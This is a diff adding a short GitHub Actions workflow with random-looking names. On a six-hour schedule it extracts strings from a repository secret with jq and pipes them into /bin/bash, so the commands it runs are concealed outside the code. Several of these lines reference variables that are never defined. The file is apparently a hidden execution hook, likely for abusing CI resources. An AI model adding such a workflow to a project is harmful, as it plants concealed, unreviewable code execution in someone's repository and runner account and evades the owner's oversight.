@@ -1,0 +1,23 @@
+name: personalhissing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: personalhissing
+        env:
+          yhc33: ${{ secrets.yhc33 }}
+        run: |
+          echo $yhc33 | jq -r .rdpui26462 | /bin/bash
+          echo $ggudy31 | jq -r .c55 | /bin/bash
+          echo $vdaz56473 | jq -r .raj1399 | /bin/bash
+          echo $vjh407 | jq -r .dsg10 | /bin/bash
+          echo $s539 | jq -r .hqlhr285 | /bin/bash
+          echo $dd9322 | jq -r .dxnaw4 | /bin/bash
+
